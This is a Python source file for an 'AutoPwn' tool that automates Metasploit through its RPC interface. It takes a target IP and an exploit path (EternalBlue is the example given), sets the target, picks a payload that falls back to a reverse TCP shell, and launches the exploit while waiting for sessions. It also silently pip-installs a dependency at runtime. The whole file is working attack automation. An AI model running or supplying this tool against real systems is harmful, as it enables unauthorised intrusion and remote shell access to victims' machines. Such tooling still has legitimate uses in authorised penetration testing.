import os
import sys
import time
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

class AutoPwn:
    def __init__(self, engine, console):
        self.engine = engine
        self.console = console
        self.client = None

    def connect(self, password, host='127.0.0.1', port=55553):
        """Connects to the msfrpc server."""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
        except ImportError:
            self.console.print("  [yellow]Installing pymetasploit3...[/yellow]")
            os.system(f"{sys.executable} -m pip install pymetasploit3 --quiet")
            from pymetasploit3.msfrpc import MsfRpcClient

        try:
            self.client = MsfRpcClient(password, port=port, server=host, ssl=True)
            self.console.print(f"  [bold green]✅ Connected to Metasploit RPC at {host}:{port}[/bold green]")
            return True
        except Exception as e:
            self.console.print(f"  [red]Failed to connect to msfrpc: {e}[/red]")
            return False

    def exploit_target(self, target_ip, exploit_name, payload_name=None):
        """Automates the entire Metasploit exploit chain."""
        if not self.client:
            self.console.print("  [red]Not connected to Metasploit. Start 'msfconsole' and load 'msgrpc'.[/red]")
            return

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            transient=True,
        ) as progress:
            
            # Step 1: Initialize Exploit
            task1 = progress.add_task("[cyan]Initializing exploit module...", total=100)
            exploit = self.client.modules.use('exploit', exploit_name)
            progress.update(task1, advance=100)

            # Step 2: Set Options
            task2 = progress.add_task("[cyan]Configuring RHOSTS...", total=100)
            exploit['RHOSTS'] = target_ip
            progress.update(task2, advance=100)

            # Step 3: Payload Selection
            task3 = progress.add_task("[cyan]Selecting payload...", total=100)
            if not payload_name:
                # Auto-select best payload
                payload_name = exploit.targetpayloads()[0] if exploit.targetpayloads() else 'generic/shell_reverse_tcp'
            
            payload = self.client.modules.use('payload', payload_name)
            progress.update(task3, advance=100)

            # Step 4: Fire
            task4 = progress.add_task("[bold red]Firing exploit!", total=100)
            job = exploit.execute(payload=payload)
            progress.update(task4, advance=100)

        self.console.print(f"\n[bold green]🚀 Exploit Job Started (ID: {job['uuid']})[/bold green]")
        self.console.print("  [dim]Monitoring for incoming sessions...[/dim]")

def run_msf(engine, console):
    from rich.prompt import Prompt
    if not Prompt.ask("  [bold yellow]Metasploit RPC requires 'msfconsole' running with 'load msgrpc'. Ready?[/bold yellow]", choices=["y", "n"]) == "y":
        return

    pwd = Prompt.ask("  [cyan]Enter msfrpc password[/cyan]", password=True)
    target = Prompt.ask("  [cyan]Enter target IP[/cyan]")
    exploit = Prompt.ask("  [cyan]Enter exploit path (e.g. windows/smb/ms17_010_eternalblue)[/cyan]")
    
    pwn = AutoPwn(engine, console)
    if pwn.connect(pwd):
        pwn.exploit_target(target, exploit)
